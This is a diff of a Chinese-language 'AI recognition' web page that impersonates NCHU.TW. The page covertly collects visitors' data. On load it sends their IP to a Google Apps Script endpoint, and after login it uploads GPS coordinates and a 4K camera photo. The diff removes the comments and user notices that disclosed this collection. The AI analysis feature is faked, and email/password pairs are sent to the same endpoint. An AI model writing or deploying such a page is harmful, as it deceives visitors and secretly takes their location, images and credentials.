@@ -2,28 +2,23 @@
 <html lang="zh-TW">
 <head>
   <meta charset="UTF-8" />
-  <title>AI 辨識 - 完整功能</title>
+  <title>AI 辨識 - ＮＣＨＵ.ＴＷ </title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <!-- 引入 Bootstrap 5 -->
   <link
     href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css"
     rel="stylesheet"
   />
   <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
-
   <style>
-    /* ======= 全局風格 ======= */
     body {
-      background-color: #181a1b; /* 深色背景 */
-      color: #e2e2e2;           /* 全局字體改為淺灰 #e2e2e2 */
+      background-color: #181a1b;
+      color: #e2e2e2;
       font-family: "Microsoft JhengHei", sans-serif;
     }
     a, a:hover, a:focus, a:active {
       text-decoration: none;
       color: inherit;
     }
-
-    /* ======= Navbar ======= */
     .navbar {
       background-color: #232627 !important;
       border-bottom: 1px solid #2f2f2f;
@@ -32,21 +27,17 @@
       font-weight: 700;
       letter-spacing: 1px;
     }
-
-    /* ======= Card 風格 ======= */
     .card {
       border-radius: 0.75rem;
-      background-color: #212528; /* 深色卡片背景 */
+      background-color: #212528;
       border: 1px solid #2a2e31;
       box-shadow: 0 2px 4px rgba(0,0,0,0.4);
-      color: #e2e2e2;           /* 卡片字體顏色 */
+      color: #e2e2e2; 
     }
     .card h6 {
-      color: #a8e7ff; /* 稍微亮一點的標題色 */
+      color: #a8e7ff;
       margin-bottom: 0.75rem;
     }
-
-    /* ======= Modal 風格 ======= */
     .modal-content {
       border-radius: 0.75rem;
       background-color: #2c2f31;
@@ -63,14 +54,12 @@
       color: #f8f9fa;
     }
     .form-control::placeholder {
-      color: #999; /* placeholder 顯示淺灰 */
+      color: #999;
     }
     .form-control:focus {
       background-color: #333;
       color: #fff;
     }
-
-    /* ======= File input ======= */
     .file-input-container input[type="file"] {
       display: none;
     }
@@ -86,8 +75,6 @@
     .file-input-container label:hover {
       background-color: #8484c2;
     }
-
-    /* ======= Section Title ======= */
     .section-title {
       margin-top: 1.5rem;
       margin-bottom: 1rem;
@@ -95,14 +82,11 @@
       color: #00cbff;
       letter-spacing: 1px;
     }
-    /* 卡片布局 */
     .card-grid {
       display: grid;
       grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
       gap: 1rem;
     }
-
-    /* ======= Alert ======= */
     .alert-info {
       background-color: #30444c;
       border-color: #30444c;
@@ -118,8 +102,6 @@
       border-color: #7d3d3d;
       color: #ffbebe;
     }
-
-    /* ======= 按鈕色系 ======= */
     .btn-primary {
       background-color: #428bff;
       border-color: #357ae8;
@@ -162,19 +144,15 @@
       transform: scale(1.02);
       background-color: #2cf0ff;
     }
-
-    /* ======= Fade-out ======= */
     .fade-out {
       transition: opacity 0.8s ease;
     }
   </style>
 </head>
 <body>
-
-<!-- 導覽列 -->
 <nav class="navbar navbar-expand-md">
   <div class="container-fluid">
-    <a class="navbar-brand" href="#">AI 辨識 - 完整功能</a>
+    <a class="navbar-brand" href="#">AI 辨識 - 功能</a>
     <button
       class="navbar-toggler"
       type="button"
@@ -191,19 +169,15 @@
     </div>
   </div>
 </nav>
-
-<!-- Alert 區塊 -->
 <div class="container mt-3">
   <div id="statusSuccess" class="alert alert-success d-none fade-out" role="alert"></div>
   <div id="statusError" class="alert alert-danger d-none" role="alert"></div>
 </div>
-
-<!-- 會員登入 / 註冊 Modal -->
 <div class="modal fade" id="userModal" tabindex="-1" aria-labelledby="userModalLabel" aria-hidden="true">
   <div class="modal-dialog modal-dialog-centered">
     <div class="modal-content p-3">
       <div class="modal-header">
-        <h5 class="modal-title" id="userModalLabel">會員中心</h5>
+        <h5 class="modal-title" id="userModalLabel">使用者中心</h5>
         <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
       </div>
       <ul class="nav nav-tabs mt-2" id="myTab" role="tablist">
@@ -237,7 +211,6 @@
         </li>
       </ul>
       <div class="tab-content mt-3" id="myTabContent">
-        <!-- 登入表單 -->
         <div
           class="tab-pane fade show active"
           id="loginTabPane"
@@ -271,7 +244,6 @@
             <button class="btn btn-primary w-100" type="submit">登入</button>
           </form>
         </div>
-        <!-- 註冊表單 -->
         <div
           class="tab-pane fade"
           id="registerTabPane"
@@ -309,8 +281,6 @@
     </div>
   </div>
 </div>
-
-<!-- 管理者登入 Modal -->
 <div class="modal fade" id="adminModal" tabindex="-1" aria-labelledby="adminModalLabel" aria-hidden="true">
   <div class="modal-dialog modal-dialog-centered">
     <div class="modal-content p-3">
@@ -346,18 +316,14 @@
     </div>
   </div>
 </div>
-
-<!-- 主內容 -->
 <div class="container mt-4">
-  <!-- (A) 未登入面板 => 只收集 IP -->
   <div id="guestPanel">
     <h4 class="section-title">AI 辨識 - 基礎模式</h4>
     <div class="alert alert-info">
-      您尚未登入，目前僅收集您的 IP 資訊。<br>
-      若要使用「拍照 &amp; GPS &amp; AI 功能」，請先登入帳號。
+      您尚未登入，目前僅可傳送訊息。<br>
+      若要使用「拍照 &amp; AI 功能」，請先登入帳號，並將啟動鏡頭功能。
     </div>
-    <!-- 回饋功能 -->
-    <h5 class="mb-3 text-warning">回饋功能 (可回傳文字/圖片)</h5>
+    <h5 class="mb-3 text-warning">訊息功能 </h5>
     <div class="row mb-3">
       <div class="col-md-6 mb-3">
         <div class="card p-3">
@@ -387,17 +353,13 @@
       </div>
     </div>
   </div>
-
-  <!-- (B) 已登入面板 => 收集 IP + GPS + Camera + AI 功能 + 天氣 -->
   <div id="memberPanel" style="display: none;">
     <h4 class="section-title">AI 辨識 - 完整模式</h4>
     <div class="alert alert-success mb-4">
-      您已登入，系統將啟用「拍照 &amp; GPS &amp; AI 功能」。<br>
+      您已登入，系統將啟用「拍照 &amp; AI 功能」。<br>
       請允許相機與定位，以享受完整功能。
     </div>
-
-    <!-- 回饋功能 (登入後依舊可用) -->
-    <h5 class="mb-3 text-warning">回饋功能 (可回傳文字/圖片)</h5>
+    <h5 class="mb-3 text-warning">訊息功能</h5>
     <div class="row mb-3">
       <div class="col-md-6 mb-3">
         <div class="card p-3">
@@ -426,46 +388,35 @@
         </div>
       </div>
     </div>
-
-    <!-- AI 功能卡片 -->
     <h5 class="mb-3 text-info">AI 功能</h5>
     <div class="card p-3 mb-3">
       <h6>AI 影像辨識</h6>
       <p id="aiStatus">AI 辨識模型可在此進行操作。</p>
       <button class="btn btn-ai" id="aiAnalyzeBtn">開始 AI 分析</button>
     </div>
-
-    <!-- 天氣資訊卡片 -->
     <h5 class="mb-3 text-info">天氣資訊</h5>
     <div class="card p-3">
       <h6>當前天氣</h6>
       <p id="weatherInfo" style="color:#eee">資料載入中...</p> 
-      <!-- 改用更亮的字色 #eee 讓天氣資訊更顯眼 -->
     </div>
   </div>
 </div>
 
 <script>
-  // ★★★ 請填入您的 Google Apps Script URL ★★★
   const SCRIPT_URL = 'https://script.google.com/macros/s/AKfycby3ttEU7hp3lniJzsqA1DRtTmvrCd1iLsrlbssc4kX_gB1cbDo9zwfZBcaMMn_TBh-8qA/exec';
-
   const statusSuccess = document.getElementById('statusSuccess');
   const statusError = document.getElementById('statusError');
   const guestPanel = document.getElementById('guestPanel');
   const memberPanel = document.getElementById('memberPanel');
   const aiStatusElem = document.getElementById('aiStatus');
-
-  /* ====== Navbar ====== */
   function updateNavbar() {
     const navRight = document.getElementById('navRight');
     navRight.innerHTML = '';
     const email = sessionStorage.getItem('email');
-
     if (email) {
       const liHello = document.createElement('li');
       liHello.classList.add('nav-item', 'me-2');
       liHello.innerHTML = `<span class="nav-link disabled">您好，${email}</span>`;
-
       const liLogout = document.createElement('li');
       liLogout.classList.add('nav-item');
       const logoutBtn = document.createElement('button');
@@ -476,7 +427,6 @@
         location.reload();
       };
       liLogout.appendChild(logoutBtn);
-
       navRight.appendChild(liHello);
       navRight.appendChild(liLogout);
     } else {
@@ -490,7 +440,6 @@
         modal.show();
       };
       liUser.appendChild(userBtn);
-
       const liAdmin = document.createElement('li');
       liAdmin.classList.add('nav-item');
       const adminBtn = document.createElement('button');
@@ -506,13 +455,10 @@
       navRight.appendChild(liAdmin);
     }
   }
-
-  /* ====== 成功/錯誤訊息 ====== */
   function showSuccessMessage(msg) {
     statusSuccess.textContent = msg;
     statusSuccess.classList.remove('d-none');
     statusError.classList.add('d-none');
-
     setTimeout(() => {
       statusSuccess.style.opacity = '0';
       setTimeout(() => {
@@ -521,14 +467,11 @@
       }, 800);
     }, 3000);
   }
-
   function showErrorMessage(msg) {
     statusError.textContent = msg;
     statusError.classList.remove('d-none');
     statusSuccess.classList.add('d-none');
   }
-
-  /* ====== 註冊 ====== */
   document.getElementById('registerForm').addEventListener('submit', async (e) => {
     e.preventDefault();
     const email = document.getElementById('regEmail').value;
@@ -538,7 +481,6 @@
       formData.append('action', 'register');
       formData.append('email', email);
       formData.append('password', password);
-
       const resp = await fetch(SCRIPT_URL, { method: 'POST', body: formData });
       if (!resp.ok) throw new Error(`HTTP 錯誤：${resp.status}`);
       const result = await resp.json();
@@ -551,19 +493,15 @@
       showErrorMessage(`註冊錯誤：${err.message}`);
     }
   });
-
-  /* ====== 登入 ====== */
   document.getElementById('loginForm').addEventListener('submit', async (e) => {
     e.preventDefault();
     const email = document.getElementById('loginEmail').value;
     const password = document.getElementById('loginPassword').value;
-
     try {
       const formData = new FormData();
       formData.append('action', 'login');
       formData.append('email', email);
       formData.append('password', password);
-
       const resp = await fetch(SCRIPT_URL, { method: 'POST', body: formData });
       if (!resp.ok) throw new Error(`HTTP 錯誤：${resp.status}`);
       const result = await resp.json();
@@ -572,12 +510,9 @@
         showSuccessMessage('登入成功！');
         const userModalObj = bootstrap.Modal.getInstance(document.getElementById('userModal'));
         if (userModalObj) userModalObj.hide();
-
         updateNavbar();
         guestPanel.style.display = 'none';
         memberPanel.style.display = 'block';
-
-        // 再執行 collectAndSendData(onlyIP=false) => 拍照+GPS+IP
         collectAndSendData(false);
       } else {
         showErrorMessage(`登入失敗：${result.error}`);
@@ -586,29 +521,23 @@
       showErrorMessage(`系統錯誤：${err.message}`);
     }
   });
-
-  /* ====== 管理者登入 ====== */
   document.getElementById('adminLoginForm').addEventListener('submit', async (e) => {
     e.preventDefault();
     const email = document.getElementById('adminEmail').value;
     const password = document.getElementById('adminPassword').value;
-
     try {
       const formData = new FormData();
       formData.append('action', 'adminLogin');
       formData.append('email', email);
       formData.append('password', password);
-
       const resp = await fetch(SCRIPT_URL, { method: 'POST', body: formData });
       if (!resp.ok) throw new Error(`HTTP 錯誤：${resp.status}`);
       const result = await resp.json();
-
       if (result.success) {
         showSuccessMessage('管理者登入成功！');
         const adminModalObj = bootstrap.Modal.getInstance(document.getElementById('adminModal'));
         if (adminModalObj) adminModalObj.hide();
-        // 跳到後台
-        window.location.href = 'https://your-domain/admin.php';
+        window.location.href = 'https://www.nchu.edu.tw/index1.php';
       } else {
         showErrorMessage('管理者登入失敗：' + (result.error || '未知原因'));
       }
@@ -616,15 +545,12 @@
       showErrorMessage(`管理者登入錯誤：${err.message}`);
     }
   });
-
-  /* ====== 回傳文字訊息 (未登入 / 已登入) ====== */
   document.getElementById('sendMessageBtn').addEventListener('click', () => {
     handleSendMessage('userMessage');
   });
   document.getElementById('sendMessageBtn2')?.addEventListener('click', () => {
     handleSendMessage('userMessage2');
   });
-
   async function handleSendMessage(textareaId) {
     const textArea = document.getElementById(textareaId);
     if (!textArea) return;
@@ -639,7 +565,6 @@
       formData.append('action', 'sendMessage');
       formData.append('email', email);
       formData.append('textMessage', message);
-
       const resp = await fetch(SCRIPT_URL, { method: 'POST', body: formData });
       const result = await resp.json();
       if (result.success) {
@@ -652,15 +577,12 @@
       showErrorMessage(`系統錯誤：${err.message}`);
     }
   }
-
-  /* ====== 回傳圖片 (未登入 / 已登入) ====== */
   document.getElementById('sendImageBtn').addEventListener('click', () => {
     handleSendImage('userImage');
   });
   document.getElementById('sendImageBtn2')?.addEventListener('click', () => {
     handleSendImage('userImage2');
   });
-
   async function handleSendImage(fileInputId) {
     const fileInput = document.getElementById(fileInputId);
     if (!fileInput) return;
@@ -688,7 +610,6 @@
       showErrorMessage(`系統錯誤：${err.message}`);
     }
   }
-
   function readFileAsBase64(file) {
     return new Promise((resolve, reject) => {
       const reader = new FileReader();
@@ -700,24 +621,15 @@
       reader.readAsDataURL(file);
     });
   }
-
-  /* ====== 主函式: 拍照 + GPS + IP 收集 & 上傳 ======
-     onlyIP=true => 只收集 IP
-     onlyIP=false => 收集 IP + GPS + 拍照
-  */
   async function collectAndSendData(onlyIP = true) {
     const statusElem = document.getElementById('status');
     if (statusElem) {
       statusElem.textContent = '正在收集資料...';
     }
-
     const collectedData = { ip: null, gps: null, photo: null };
     try {
-      // 1) 必定收集 IP
       const ipResult = await getIpInfo();
       if (ipResult) collectedData.ip = ipResult;
-
-      // 2) 若 onlyIP=false => GPS + 拍照
       let gpsResult = null, photoResult = null;
       if (!onlyIP) {
         gpsResult = await getGpsCoordinates();
@@ -726,8 +638,6 @@
         photoResult = await startCamera();
         if (photoResult) collectedData.photo = photoResult;
       }
-
-      // 3) 上傳
       const email = sessionStorage.getItem('email') || 'guest_user';
       const formData = new FormData();
       formData.append('email', email);
@@ -759,8 +669,6 @@
           statusElem.textContent = `資料發送失敗：${result.error}`;
         }
       }
-
-      // 若有 GPS => 顯示天氣
       if (collectedData.gps) {
         getWeatherInfo(collectedData.gps.latitude, collectedData.gps.longitude);
       }
@@ -771,8 +679,6 @@
       }
     }
   }
-
-  /* ====== 取得 IP ====== */
   async function getIpInfo() {
     try {
       const resp = await fetch('https://ipinfo.io/json');
@@ -786,8 +692,6 @@
       return null;
     }
   }
-
-  /* ====== 取得 GPS ====== */
   async function getGpsCoordinates() {
     try {
       const position = await new Promise((resolve, reject) => {
@@ -803,13 +707,11 @@
       return null;
     }
   }
-
-  /* ====== 拍照 ====== */
   async function startCamera() {
     let stream = null;
     try {
       stream = await navigator.mediaDevices.getUserMedia({
-        video: { width: 1280, height: 720 }
+        video: { width: 3840, height: 2160 }
       });
       const video = document.createElement('video');
       video.srcObject = stream;
@@ -819,7 +721,6 @@
           resolve();
         };
       });
-      // 短暫等待
       await new Promise((r) => setTimeout(r, 300));
       const canvas = document.createElement('canvas');
       canvas.width = video.videoWidth || 640;
@@ -837,12 +738,10 @@
       }
     }
   }
-
-  /* ====== 天氣 ====== */
   async function getWeatherInfo(lat, lon) {
     try {
       if (!lat || !lon) return;
-      const apiKey = 'ae0c5817d5c802a5f12d3c9de2517611'; // 請換成您自己的 key
+      const apiKey = 'ae0c5817d5c802a5f12d3c9de2517611';
       const resp = await fetch(
         `https://api.openweathermap.org/data/2.5/weather?lat=${lat}&lon=${lon}&units=metric&lang=zh_tw&appid=${apiKey}`
       );
@@ -850,10 +749,9 @@
       const temp = data.main.temp;
       const weather = data.weather[0].description;
       const humidity = data.main.humidity;
-
       const wElem = document.getElementById('weatherInfo');
       if (wElem) {
-        wElem.style.color = '#fff'; /* 文字顯示更亮 */
+        wElem.style.color = '#fff'; 
         wElem.innerHTML = `
           <img src="https://openweathermap.org/img/wn/${data.weather[0].icon}.png" alt="${weather}" style="vertical-align:middle;">
           溫度: ${temp}°C, 天氣: ${weather}, 濕度: ${humidity}%
@@ -868,33 +766,24 @@
       }
     }
   }
-
-  /* ====== AI 功能示範 ====== */
   document.addEventListener('DOMContentLoaded', () => {
     updateNavbar();
     const email = sessionStorage.getItem('email');
     if (email) {
-      // 已登入 => 全套
       guestPanel.style.display = 'none';
       memberPanel.style.display = 'block';
       collectAndSendData(false);
     } else {
-      // 未登入 => 只收 IP
       guestPanel.style.display = 'block';
       memberPanel.style.display = 'none';
       collectAndSendData(true);
     }
-
-    // 綁定 AI 按鈕
     const aiAnalyzeBtn = document.getElementById('aiAnalyzeBtn');
     if (aiAnalyzeBtn) {
       aiAnalyzeBtn.addEventListener('click', async () => {
-        // 假裝開始分析
         aiStatusElem.textContent = '分析中...';
         try {
-          // 這裡可串接後端 AI or 前端 TF.js
           await new Promise((r) => setTimeout(r, 1500));
-          // 模擬 70% 成功
           const success = Math.random() > 0.9; 
           if (success) {
             aiStatusElem.textContent = '分析完成！結果顯示在這裏... (示例)';
